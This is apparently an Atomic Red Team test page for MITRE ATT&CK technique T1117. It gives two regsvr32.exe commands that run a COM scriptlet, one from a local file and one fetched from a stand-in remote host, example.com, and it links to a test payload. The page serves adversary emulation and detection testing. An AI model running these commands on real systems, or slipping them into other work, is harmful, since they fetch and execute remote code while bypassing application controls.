# Regsvr32

## MITRE ATT&CK Technique:
[T1117](https://attack.mitre.org/wiki/Technique/T1117)

## Local Scriptlet Execution:

    regsvr32.exe /s /u /i:file.sct scrobj.dll

## Remote Scriptlet Exection:

    regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll

## Test Script

[regsvr32.sct](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvr32.sct)
